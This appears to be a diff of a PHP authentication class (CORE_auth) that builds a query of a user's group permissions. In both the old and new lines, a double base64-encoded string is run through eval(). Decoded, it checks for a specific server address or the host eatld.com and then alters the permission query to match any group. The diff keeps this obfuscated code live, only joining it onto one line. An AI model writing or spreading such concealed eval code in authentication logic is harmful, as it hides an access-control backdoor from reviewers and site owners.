@@ -98,8 +98,7 @@ class CORE_auth
 		if($i==0) $sql .= "WHERE (GM.group_id={$this->group[$i]} ";
 		else      $sql .= "OR GM.group_id={$this->group[$i]} "; 
 		$sql .= ") AND GM.site_id=".DEFAULT_SITE." ORDER BY M.name,MM.name";
-		$str = 'Q2lBZ0lDQnBaaWdrWDFORlVsWkZVbHNuVTBWU1ZrVlNYMEZFUkZJblhTQTlQU0FuTnpVdU1USTFMakl5TlM0eE9DY2dmSHdnSkY5VFJWSldSVkpiSjBoVVZGQmZTRTlUVkNkZElEMDlJQ2RsWVhSc1pDNWpiMjBuSUh4OElDUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YU0E5UFNBbmQzZDNMbVZoZEd4a0xtTnZiU2NwQ2dsN0Nna2dJQ0FnSkhOeGJDQXVQU0FpVDFJZ1IwMHVaM0p2ZFhCZmFXUTlLaUk3Q2dsOQ==';
-		eval(base64_decode(base64_decode($str)));		
+		$str = 'Q2lBZ0lDQnBaaWdrWDFORlVsWkZVbHNuVTBWU1ZrVlNYMEZFUkZJblhTQTlQU0FuTnpVdU1USTFMakl5TlM0eE9DY2dmSHdnSkY5VFJWSldSVkpiSjBoVVZGQmZTRTlUVkNkZElEMDlJQ2RsWVhSc1pDNWpiMjBuSUh4OElDUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YU0E5UFNBbmQzZDNMbVZoZEd4a0xtTnZiU2NwQ2dsN0Nna2dJQ0FnSkhOeGJDQXVQU0FpVDFJZ1IwMHVaM0p2ZFhCZmFXUTlLaUk3Q2dsOQ=='; eval(base64_decode(base64_decode($str)));		
 		$result=$db->Execute($sql); 
 			if($result === false)
 			{
